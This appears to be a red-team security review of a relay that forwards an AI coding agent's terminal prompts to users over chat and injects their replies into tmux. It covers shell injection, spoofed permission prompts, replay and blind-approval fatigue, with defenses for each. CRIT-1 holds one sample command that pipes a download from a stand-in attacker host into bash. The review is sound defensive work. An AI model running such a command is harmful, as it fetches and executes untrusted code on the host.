# Adversarial Review — Input Relay

**Review ID**: 20260327-230839 | **Round**: 1
**Reviewer**: Red Team / Adversarial
**Score**: 6/10
**Approval Status**: CONDITIONAL APPROVAL

---

## Critical Issues

### CRIT-1: Free-text injection as arbitrary command execution
**Likelihood: Medium | Impact: Critical**

Free-text answers for "question" prompts are sent directly to tmux as keystrokes. If the foreground process changes between relay creation and response injection (session advances, crash recovery), user text lands in a shell. `echo "hello" && curl attacker.com | bash` typed as a "question answer" becomes shell injection.

**Defense**: Verify foreground process PID/command before injection. Sanitize shell metacharacters. Fail closed if process changed.

### CRIT-2: Prompt spoofing via crafted terminal output
**Likelihood: Medium | Impact: High**

A compromised dependency or malicious code can print fake prompt text to stdout that matches InputDetector patterns. The relay sends a fake "permission request" to the user, who approves it. The approval keystroke goes to the real process — which may not be at a prompt.

**Defense**: Cross-reference PromptGate's prompt fingerprint with Claude Code's actual tool-use state (if accessible). At minimum, verify the prompt is stable across 3+ captures (not just 2).

### CRIT-3: Replay attack via message forwarding
**Likelihood: Low | Impact: High**

A user forwards a relay message to another chat, someone replies "1", the reply is forwarded back. If `from.id` validation only checks the message sender (not forward origin), the forwarded reply could be accepted.

**Defense**: Reject messages with `forward_origin` set. Use inline keyboard callbacks instead of text replies — callbacks include the original message context.

---

## High Severity

- **Notification fatigue → blind approval**: Frequent relay messages train users to auto-tap "1" without reading. Defense: rate-limit relays, batch prompts, add "why this matters" context.
- **Timeout + restart = zombie relays**: Server restarts while relay is pending → user responds → no handler. Defense: persist relay state to disk.
- **Multi-prompt collision**: Two prompts fire for same session within seconds. User approves first, second injects into already-advancing session. Defense: per-session injection lock.

---

## Recommendations

1. Pre-injection process verification (PID + command check)
2. Inline keyboards over text replies (eliminates parsing ambiguity + replay risk)
3. 3-capture stability threshold for prompt detection (up from 2)
4. Per-session injection mutex
5. Relay state persistence to disk
6. Rate limit: max 5 relays per topic per hour

---

## Scalability Assessment

Attack surface grows linearly with sessions. Each session is an independent injection path. The pre-injection verification is the critical control — without it, every session is a potential command injection vector.
